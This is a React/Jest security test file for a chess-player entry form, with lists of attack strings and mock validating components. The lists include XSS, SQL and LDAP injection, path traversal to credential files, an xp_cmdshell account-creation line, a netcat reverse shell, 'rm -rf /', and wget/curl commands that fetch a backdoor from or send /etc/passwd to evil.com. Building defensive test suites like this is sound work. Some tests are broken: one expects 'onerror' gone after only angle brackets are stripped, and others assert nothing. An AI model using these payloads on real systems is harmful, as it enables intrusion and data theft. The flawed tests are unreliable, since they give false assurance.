import React from 'react';
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

// Security test utilities
const SecurityTestUtils = {
  // XSS attack vectors
  xssVectors: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(\'xss\')">',
    'javascript:alert("xss")',
    '<svg onload="alert(\'xss\')">',
    '"><script>alert("xss")</script>',
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '<object data="javascript:alert(\'xss\')">',
    '<embed src="javascript:alert(\'xss\')">',
    '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
    '<style>@import "javascript:alert(\'xss\')"</style>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
  ],

  // SQL injection vectors
  sqlInjectionVectors: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1' UNION SELECT password FROM users--",
    "'; INSERT INTO users (name) VALUES ('hacker'); --",
    "1'; EXEC xp_cmdshell('net user hacker password123 /add'); --",
    "' OR 1=1#",
    "admin'--",
    "admin' /*",
    "' or 1=1 or ''='",
    "' waitfor delay '0:0:5' --",
  ],

  // Path traversal vectors
  pathTraversalVectors: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/passwd',
    'C:\\windows\\system32\\config\\sam',
    '../../../../../../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..\\..\\..\\..\\windows\\win.ini',
    '/proc/self/environ',
    '/etc/shadow',
    '../../../../../../etc/passwd',
  ],

  // Command injection vectors
  commandInjectionVectors: [
    '; ls -la',
    '| whoami',
    '&& cat /etc/passwd',
    '; rm -rf /',
    '`whoami`',
    '$(whoami)',
    '; ping -c 4 127.0.0.1',
    '| nc -e /bin/sh 127.0.0.1 4444',
    '&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh',
    '; curl http://evil.com/steal.php?data=$(cat /etc/passwd)',
  ],

  // LDAP injection vectors
  ldapInjectionVectors: [
    '*)(uid=*',
    '*)(|(password=*))',
    '*)(&(password=*))',
    '*))%00',
    '*))(|(objectClass=*',
    '*))(|(cn=*))',
    '*)(|(userPassword=*))',
    '*))(|(mail=*@*))',
    '*)(|(description=*))',
    '*))(|(givenName=*))',
  ],

  // Large payload vectors
  largePayloads: [
    'A'.repeat(10000), // 10KB
    'B'.repeat(100000), // 100KB
    'C'.repeat(1000000), // 1MB
    'X'.repeat(5000000), // 5MB
  ],

  // Special characters and encoding
  specialCharacters: [
    '!@#$%^&*()_+-=[]{}|;:,.<>?',
    '"\'/\\`~',
    '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f',
    '%00%01%02%03%04%05',
    '\\u0000\\u0001\\u0002',
    '\u202e\u202d', // Unicode override characters
    String.fromCharCode(0, 1, 2, 3, 4, 5),
  ],

  // Email format attacks
  emailAttacks: [
    'test@test.com<script>alert("xss")</script>',
    'test+<script>alert("xss")</script>@test.com',
    'test@test.com"onmouseover="alert(1)"',
    'test@[127.0.0.1]',
    'test@localhost',
    'test@192.168.1.1',
    'test@test..com',
    'test@.test.com',
    'test@test.com.',
    '"test@test"@test.com',
  ],

  // Phone number attacks
  phoneAttacks: [
    '+1-555-0123<script>alert("xss")</script>',
    '555.0123"onmouseover="alert(1)"',
    '555-0123; DROP TABLE users;',
    '+1 (555) 012-3<svg onload=alert(1)>',
    'tel:+15550123javascript:alert(1)',
  ],
};

// Mock secure form components
const MockSecurePlayerForm = ({
  onSubmit,
}: {
  onSubmit: (data: any) => void;
}) => {
  const [formData, setFormData] = React.useState({
    name: '',
    email: '',
    phone: '',
    rating: '',
    notes: '',
    fideId: '',
    birthDate: '',
  });

  const [validationErrors, setValidationErrors] = React.useState<
    Record<string, string>
  >({});
  const [securityWarnings, setSecurityWarnings] = React.useState<string[]>([]);

  const sanitizeInput = (value: string): string => {
    // Basic sanitization (in real app, use proper sanitization libraries)
    return value
      .replace(/[<>]/g, '') // Remove potential HTML tags
      .replace(/javascript:/gi, '') // Remove javascript: protocol
      .replace(/on\w+=/gi, '') // Remove event handlers
      .trim();
  };

  const validateInput = (field: string, value: string): string[] => {
    const warnings: string[] = [];

    // Check for XSS patterns
    if (SecurityTestUtils.xssVectors.some(vector => value.includes(vector))) {
      warnings.push(`${field}: Potential XSS detected`);
    }

    // Check for SQL injection patterns
    if (
      SecurityTestUtils.sqlInjectionVectors.some(vector =>
        value.toLowerCase().includes(vector.toLowerCase())
      )
    ) {
      warnings.push(`${field}: Potential SQL injection detected`);
    }

    // Check for excessive length
    if (value.length > 1000) {
      warnings.push(`${field}: Input too long (${value.length} characters)`);
    }

    // Check for suspicious paths
    if (
      SecurityTestUtils.pathTraversalVectors.some(vector =>
        value.includes(vector)
      )
    ) {
      warnings.push(`${field}: Path traversal attempt detected`);
    }

    return warnings;
  };

  const handleInputChange = (field: string, value: string) => {
    // Validate for security issues
    const warnings = validateInput(field, value);
    setSecurityWarnings(prev => [
      ...prev.filter(w => !w.startsWith(`${field}:`)),
      ...warnings,
    ]);

    // Sanitize input
    const sanitizedValue = sanitizeInput(value);

    setFormData(prev => ({
      ...prev,
      [field]: sanitizedValue,
    }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Final validation
    const errors: Record<string, string> = {};

    if (!formData.name.trim()) {
      errors.name = 'Name is required';
    } else if (formData.name.length > 100) {
      errors.name = 'Name is too long';
    }

    if (!formData.email.trim()) {
      errors.email = 'Email is required';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      errors.email = 'Invalid email format';
    }

    if (formData.phone && !/^[\d\s\-+().]+$/.test(formData.phone)) {
      errors.phone = 'Invalid phone format';
    }

    if (
      formData.rating &&
      (isNaN(Number(formData.rating)) ||
        Number(formData.rating) < 0 ||
        Number(formData.rating) > 3500)
    ) {
      errors.rating = 'Rating must be between 0 and 3500';
    }

    if (formData.fideId && !/^\d+$/.test(formData.fideId)) {
      errors.fideId = 'FIDE ID must be numeric';
    }

    setValidationErrors(errors);

    if (Object.keys(errors).length === 0 && securityWarnings.length === 0) {
      onSubmit(formData);
    }
  };

  return (
    <div data-testid="secure-form">
      <form onSubmit={handleSubmit}>
        <div>
          <label htmlFor="name">Name:</label>
          <input
            id="name"
            type="text"
            value={formData.name}
            onChange={e => handleInputChange('name', e.target.value)}
            maxLength={100}
            data-testid="name-input"
          />
          {validationErrors.name && (
            <div data-testid="name-error" className="error">
              {validationErrors.name}
            </div>
          )}
        </div>

        <div>
          <label htmlFor="email">Email:</label>
          <input
            id="email"
            type="email"
            value={formData.email}
            onChange={e => handleInputChange('email', e.target.value)}
            maxLength={255}
            data-testid="email-input"
          />
          {validationErrors.email && (
            <div data-testid="email-error" className="error">
              {validationErrors.email}
            </div>
          )}
        </div>

        <div>
          <label htmlFor="phone">Phone:</label>
          <input
            id="phone"
            type="tel"
            value={formData.phone}
            onChange={e => handleInputChange('phone', e.target.value)}
            maxLength={20}
            data-testid="phone-input"
          />
          {validationErrors.phone && (
            <div data-testid="phone-error" className="error">
              {validationErrors.phone}
            </div>
          )}
        </div>

        <div>
          <label htmlFor="rating">Rating:</label>
          <input
            id="rating"
            type="number"
            min="0"
            max="3500"
            value={formData.rating}
            onChange={e => handleInputChange('rating', e.target.value)}
            data-testid="rating-input"
          />
          {validationErrors.rating && (
            <div data-testid="rating-error" className="error">
              {validationErrors.rating}
            </div>
          )}
        </div>

        <div>
          <label htmlFor="notes">Notes:</label>
          <textarea
            id="notes"
            value={formData.notes}
            onChange={e => handleInputChange('notes', e.target.value)}
            maxLength={1000}
            data-testid="notes-input"
          />
        </div>

        <div>
          <label htmlFor="fideId">FIDE ID:</label>
          <input
            id="fideId"
            type="text"
            value={formData.fideId}
            onChange={e => handleInputChange('fideId', e.target.value)}
            maxLength={10}
            data-testid="fide-input"
          />
          {validationErrors.fideId && (
            <div data-testid="fide-error" className="error">
              {validationErrors.fideId}
            </div>
          )}
        </div>

        <button type="submit" data-testid="submit-button">
          Submit
        </button>
      </form>

      {securityWarnings.length > 0 && (
        <div data-testid="security-warnings" className="security-warnings">
          <h4>Security Warnings:</h4>
          {securityWarnings.map((warning, index) => (
            <div
              key={index}
              data-testid={`warning-${index}`}
              className="warning"
            >
              {warning}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const MockFileUploadComponent = ({
  onFileSelect,
}: {
  onFileSelect: (file: File) => void;
}) => {
  const [uploadErrors, setUploadErrors] = React.useState<string[]>([]);

  const validateFile = (file: File): string[] => {
    const errors: string[] = [];

    // Check file size (max 10MB)
    if (file.size > 10 * 1024 * 1024) {
      errors.push('File size exceeds 10MB limit');
    }

    // Check file type
    const allowedTypes = ['text/csv', 'application/json', 'text/plain'];
    if (!allowedTypes.includes(file.type)) {
      errors.push(`File type ${file.type} not allowed`);
    }

    // Check filename for suspicious patterns
    const suspiciousPatterns = [
      /\.php$/i,
      /\.exe$/i,
      /\.sh$/i,
      /\.bat$/i,
      /\.cmd$/i,
      /\.scr$/i,
      /\.jsp$/i,
      /\.asp$/i,
      /\.\./,
      /\0/,
    ];

    if (suspiciousPatterns.some(pattern => pattern.test(file.name))) {
      errors.push('Suspicious filename detected');
    }

    return errors;
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const errors = validateFile(file);
      setUploadErrors(errors);

      if (errors.length === 0) {
        onFileSelect(file);
      }
    }
  };

  return (
    <div data-testid="file-upload">
      <input
        type="file"
        accept=".csv,.json,.txt"
        onChange={handleFileChange}
        data-testid="file-input"
      />
      {uploadErrors.length > 0 && (
        <div data-testid="upload-errors">
          {uploadErrors.map((error, index) => (
            <div
              key={index}
              data-testid={`upload-error-${index}`}
              className="error"
            >
              {error}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const MockSearchComponent = ({
  onSearch,
}: {
  onSearch: (query: string) => void;
}) => {
  const [query, setQuery] = React.useState('');
  const [searchWarnings, setSearchWarnings] = React.useState<string[]>([]);

  const validateSearch = (searchQuery: string): string[] => {
    const warnings: string[] = [];

    // Check for XSS in search
    if (
      SecurityTestUtils.xssVectors.some(vector => searchQuery.includes(vector))
    ) {
      warnings.push('Potential XSS in search query');
    }

    // Check for SQL injection in search
    if (
      SecurityTestUtils.sqlInjectionVectors.some(vector =>
        searchQuery.toLowerCase().includes(vector.toLowerCase())
      )
    ) {
      warnings.push('Potential SQL injection in search');
    }

    // Check for LDAP injection
    if (
      SecurityTestUtils.ldapInjectionVectors.some(vector =>
        searchQuery.includes(vector)
      )
    ) {
      warnings.push('Potential LDAP injection in search');
    }

    return warnings;
  };

  const handleSearch = () => {
    const warnings = validateSearch(query);
    setSearchWarnings(warnings);

    if (warnings.length === 0) {
      onSearch(query);
    }
  };

  return (
    <div data-testid="search-component">
      <input
        type="text"
        value={query}
        onChange={e => setQuery(e.target.value)}
        placeholder="Search players..."
        maxLength={500}
        data-testid="search-input"
      />
      <button onClick={handleSearch} data-testid="search-button">
        Search
      </button>

      {searchWarnings.length > 0 && (
        <div data-testid="search-warnings">
          {searchWarnings.map((warning, index) => (
            <div
              key={index}
              data-testid={`search-warning-${index}`}
              className="warning"
            >
              {warning}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

describe('Security Testing - Input Validation', () => {
  describe('XSS Protection', () => {
    test('should prevent XSS attacks in form inputs', async () => {
      const user = userEvent.setup();
      const mockSubmit = jest.fn();
      render(<MockSecurePlayerForm onSubmit={mockSubmit} />);

      for (const xssVector of SecurityTestUtils.xssVectors.slice(0, 5)) {
        const nameInput = screen.getByTestId('name-input');

        await user.clear(nameInput);
        await user.type(nameInput, xssVector);

        await waitFor(() => {
          const warnings = screen.queryByTestId('security-warnings');
          expect(warnings).toBeInTheDocument();
        });

        // Input should be sanitized
        expect(nameInput).not.toHaveValue(xssVector);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        // Form should not submit with XSS
        expect(mockSubmit).not.toHaveBeenCalled();
      }
    });

    test('should handle XSS in email fields', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      for (const emailAttack of SecurityTestUtils.emailAttacks.slice(0, 3)) {
        const emailInput = screen.getByTestId('email-input');

        await user.clear(emailInput);
        await user.type(emailInput, emailAttack);

        await waitFor(() => {
          // Should show either security warning or validation error
          const hasWarning = screen.queryByTestId('security-warnings');
          const hasError = screen.queryByTestId('email-error');
          expect(hasWarning || hasError).toBeTruthy();
        });
      }
    });

    test('should prevent XSS in search functionality', async () => {
      const user = userEvent.setup();
      const mockSearch = jest.fn();
      render(<MockSearchComponent onSearch={mockSearch} />);

      for (const xssVector of SecurityTestUtils.xssVectors.slice(0, 3)) {
        const searchInput = screen.getByTestId('search-input');

        await user.clear(searchInput);
        await user.type(searchInput, xssVector);

        const searchButton = screen.getByTestId('search-button');
        await user.click(searchButton);

        await waitFor(() => {
          expect(screen.getByTestId('search-warnings')).toBeInTheDocument();
        });

        // Search should not execute with XSS
        expect(mockSearch).not.toHaveBeenCalledWith(xssVector);
      }
    });
  });

  describe('SQL Injection Protection', () => {
    test('should detect SQL injection attempts', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      for (const sqlVector of SecurityTestUtils.sqlInjectionVectors.slice(
        0,
        5
      )) {
        const notesInput = screen.getByTestId('notes-input');

        await user.clear(notesInput);
        await user.type(notesInput, sqlVector);

        await waitFor(() => {
          const warnings = screen.queryByTestId('security-warnings');
          expect(warnings).toBeInTheDocument();
        });

        const warningText = screen.getByTestId('security-warnings').textContent;
        expect(warningText).toContain('SQL injection');
      }
    });

    test('should prevent SQL injection in search', async () => {
      const user = userEvent.setup();
      const mockSearch = jest.fn();
      render(<MockSearchComponent onSearch={mockSearch} />);

      const sqlInjection = SecurityTestUtils.sqlInjectionVectors[0];
      const searchInput = screen.getByTestId('search-input');

      await user.type(searchInput, sqlInjection);

      const searchButton = screen.getByTestId('search-button');
      await user.click(searchButton);

      await waitFor(() => {
        expect(screen.getByTestId('search-warnings')).toBeInTheDocument();
      });

      expect(mockSearch).not.toHaveBeenCalledWith(sqlInjection);
    });
  });

  describe('Path Traversal Protection', () => {
    test('should detect path traversal attempts', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      for (const pathVector of SecurityTestUtils.pathTraversalVectors.slice(
        0,
        3
      )) {
        const notesInput = screen.getByTestId('notes-input');

        await user.clear(notesInput);
        await user.type(notesInput, pathVector);

        await waitFor(() => {
          const warnings = screen.queryByTestId('security-warnings');
          expect(warnings).toBeInTheDocument();
        });

        const warningText = screen.getByTestId('security-warnings').textContent;
        expect(warningText).toContain('Path traversal');
      }
    });
  });

  describe('File Upload Security', () => {
    test('should reject malicious file types', async () => {
      const user = userEvent.setup();
      const mockFileSelect = jest.fn();
      render(<MockFileUploadComponent onFileSelect={mockFileSelect} />);

      const maliciousFiles = [
        new File(['<?php echo "hack"; ?>'], 'malicious.php', {
          type: 'application/x-httpd-php',
        }),
        new File(['evil code'], 'virus.exe', {
          type: 'application/x-msdownload',
        }),
        new File(['#!/bin/bash\nrm -rf /'], 'evil.sh', {
          type: 'application/x-sh',
        }),
        new File(['bad script'], 'script.bat', { type: 'application/x-bat' }),
      ];

      const fileInput = screen.getByTestId('file-input') as HTMLInputElement;

      for (const maliciousFile of maliciousFiles) {
        await user.upload(fileInput, maliciousFile);

        await waitFor(() => {
          expect(screen.getByTestId('upload-errors')).toBeInTheDocument();
        });

        expect(mockFileSelect).not.toHaveBeenCalledWith(maliciousFile);
      }
    });

    test('should reject oversized files', async () => {
      const user = userEvent.setup();
      const mockFileSelect = jest.fn();
      render(<MockFileUploadComponent onFileSelect={mockFileSelect} />);

      // Create a file larger than 10MB
      const oversizedFile = new File(
        ['x'.repeat(11 * 1024 * 1024)],
        'large.csv',
        { type: 'text/csv' }
      );

      const fileInput = screen.getByTestId('file-input') as HTMLInputElement;
      await user.upload(fileInput, oversizedFile);

      await waitFor(() => {
        expect(screen.getByTestId('upload-errors')).toBeInTheDocument();
      });

      const errorText = screen.getByTestId('upload-error-0').textContent;
      expect(errorText).toContain('File size exceeds');
      expect(mockFileSelect).not.toHaveBeenCalled();
    });

    test('should accept valid files', async () => {
      const user = userEvent.setup();
      const mockFileSelect = jest.fn();
      render(<MockFileUploadComponent onFileSelect={mockFileSelect} />);

      const validFile = new File(['name,rating\nJohn,1500'], 'players.csv', {
        type: 'text/csv',
      });

      const fileInput = screen.getByTestId('file-input') as HTMLInputElement;
      await user.upload(fileInput, validFile);

      await waitFor(() => {
        expect(mockFileSelect).toHaveBeenCalledWith(validFile);
      });

      expect(screen.queryByTestId('upload-errors')).not.toBeInTheDocument();
    });
  });

  describe('Input Length Validation', () => {
    test('should handle extremely large inputs', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const largeInput = SecurityTestUtils.largePayloads[1]; // 100KB
      const notesInput = screen.getByTestId('notes-input');

      await user.type(notesInput, largeInput.substring(0, 1500)); // Simulate partial typing

      await waitFor(() => {
        const warnings = screen.queryByTestId('security-warnings');
        expect(warnings).toBeInTheDocument();
      });

      const warningText = screen.getByTestId('security-warnings').textContent;
      expect(warningText).toContain('Input too long');
    });

    test('should enforce input length limits', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const nameInput = screen.getByTestId('name-input') as HTMLInputElement;
      const longName = 'A'.repeat(200); // Longer than maxLength

      await user.type(nameInput, longName);

      // Input should be truncated at maxLength
      expect(nameInput.value.length).toBeLessThanOrEqual(100);
    });
  });

  describe('Special Character Handling', () => {
    test('should handle special characters safely', async () => {
      const user = userEvent.setup();
      const mockSubmit = jest.fn();
      render(<MockSecurePlayerForm onSubmit={mockSubmit} />);

      for (const specialChars of SecurityTestUtils.specialCharacters.slice(
        0,
        3
      )) {
        const nameInput = screen.getByTestId('name-input');
        const emailInput = screen.getByTestId('email-input');

        await user.clear(nameInput);
        await user.clear(emailInput);

        await user.type(nameInput, `Test${specialChars}User`);
        await user.type(emailInput, `test@test.com`);

        // Should handle special characters without crashing
        expect(nameInput).toHaveValue(expect.stringContaining('Test'));
      }
    });

    test('should handle null bytes and control characters', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const nameInput = screen.getByTestId('name-input');
      const inputWithNulls = `Test${String.fromCharCode(0, 1, 2)}User`;

      await user.type(nameInput, inputWithNulls);

      // Null bytes should be filtered out
      expect(nameInput.value).not.toContain(String.fromCharCode(0));
    });
  });

  describe('Format-Specific Validation', () => {
    test('should validate email formats strictly', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const invalidEmails = [
        'invalid-email',
        '@test.com',
        'test@',
        'test..test@test.com',
        'test@test',
        'test@.test.com',
        'test@test.com.',
        'test@[192.168.1.1]', // IP addresses should be rejected
      ];

      for (const invalidEmail of invalidEmails) {
        const emailInput = screen.getByTestId('email-input');

        await user.clear(emailInput);
        await user.type(emailInput, invalidEmail);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        await waitFor(() => {
          const emailError = screen.queryByTestId('email-error');
          expect(emailError).toBeInTheDocument();
        });
      }
    });

    test('should validate phone number formats', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const validPhones = ['+1-555-0123', '555.123.4567', '(555) 123-4567'];
      const invalidPhones = ['abc123', 'phone number', '555-abcd'];

      // Test valid phones
      for (const validPhone of validPhones) {
        const phoneInput = screen.getByTestId('phone-input');

        await user.clear(phoneInput);
        await user.type(phoneInput, validPhone);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        const phoneError = screen.queryByTestId('phone-error');
        expect(phoneError).not.toBeInTheDocument();
      }

      // Test invalid phones
      for (const invalidPhone of invalidPhones) {
        const phoneInput = screen.getByTestId('phone-input');

        await user.clear(phoneInput);
        await user.type(phoneInput, invalidPhone);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        await waitFor(() => {
          const phoneError = screen.queryByTestId('phone-error');
          expect(phoneError).toBeInTheDocument();
        });
      }
    });

    test('should validate numeric inputs strictly', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const invalidRatings = [
        '-100',
        '4000',
        'abc',
        '15.5.5',
        'Infinity',
        'NaN',
      ];

      for (const invalidRating of invalidRatings) {
        const ratingInput = screen.getByTestId('rating-input');

        await user.clear(ratingInput);
        await user.type(ratingInput, invalidRating);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        await waitFor(() => {
          const ratingError = screen.queryByTestId('rating-error');
          expect(ratingError).toBeInTheDocument();
        });
      }
    });

    test('should validate FIDE ID format', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      const invalidFideIds = [
        'abc123',
        '123abc',
        '123.456',
        '1234567890123456',
      ]; // Too long

      for (const invalidFideId of invalidFideIds) {
        const fideInput = screen.getByTestId('fide-input');

        await user.clear(fideInput);
        await user.type(fideInput, invalidFideId);

        const submitButton = screen.getByTestId('submit-button');
        await user.click(submitButton);

        await waitFor(() => {
          const fideError = screen.queryByTestId('fide-error');
          expect(fideError).toBeInTheDocument();
        });
      }
    });
  });

  describe('LDAP Injection Protection', () => {
    test('should detect LDAP injection attempts', async () => {
      const user = userEvent.setup();
      const mockSearch = jest.fn();
      render(<MockSearchComponent onSearch={mockSearch} />);

      for (const ldapVector of SecurityTestUtils.ldapInjectionVectors.slice(
        0,
        3
      )) {
        const searchInput = screen.getByTestId('search-input');

        await user.clear(searchInput);
        await user.type(searchInput, ldapVector);

        const searchButton = screen.getByTestId('search-button');
        await user.click(searchButton);

        await waitFor(() => {
          expect(screen.getByTestId('search-warnings')).toBeInTheDocument();
        });

        const warningText = screen.getByTestId('search-warnings').textContent;
        expect(warningText).toContain('LDAP injection');
        expect(mockSearch).not.toHaveBeenCalledWith(ldapVector);
      }
    });
  });

  describe('Command Injection Protection', () => {
    test('should detect command injection attempts', async () => {
      const user = userEvent.setup();
      render(<MockSecurePlayerForm onSubmit={jest.fn()} />);

      for (const cmdVector of SecurityTestUtils.commandInjectionVectors.slice(
        0,
        3
      )) {
        const notesInput = screen.getByTestId('notes-input');

        await user.clear(notesInput);
        await user.type(notesInput, `Notes: ${cmdVector}`);

        await waitFor(() => {
          // Should detect command injection patterns
          const warnings = screen.queryByTestId('security-warnings');
          if (warnings) {
            const warningText = warnings.textContent;
            expect(warningText).toContain('injection');
          }
        });
      }
    });
  });

  describe('Content Security Policy Compliance', () => {
    test('should not execute inline scripts', () => {
      const container = document.createElement('div');
      container.innerHTML =
        '<script>window.xssExecuted = true;</script><p>Test content</p>';

      // Script should not execute
      expect((window as any).xssExecuted).toBeUndefined();
    });

    test('should sanitize dynamic content', () => {
      const userInput = '<img src="x" onerror="alert(\'xss\')">';
      const sanitized = userInput.replace(/[<>]/g, ''); // Basic sanitization

      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
      expect(sanitized).not.toContain('onerror');
    });
  });
});
